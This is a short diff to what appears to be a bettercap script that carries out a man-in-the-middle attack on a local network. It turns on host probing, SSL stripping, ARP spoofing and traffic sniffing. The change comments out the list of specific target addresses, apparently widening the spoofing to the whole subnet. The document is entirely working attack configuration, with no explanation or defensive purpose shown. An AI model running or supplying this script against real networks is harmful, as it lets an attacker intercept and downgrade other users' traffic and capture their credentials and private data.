@@ -1,6 +1,6 @@
 net.probe on
 set http.proxy.sslstrip true
-set arp.spoof.targets 192.168.1.10,192.168.1.8
+#set arp.spoof.targets 192.168.1.20,192.168.1.8,192.168.1.17,192.168.1.5
 arp.spoof on
 set net.sniff.local true
 net.sniff on
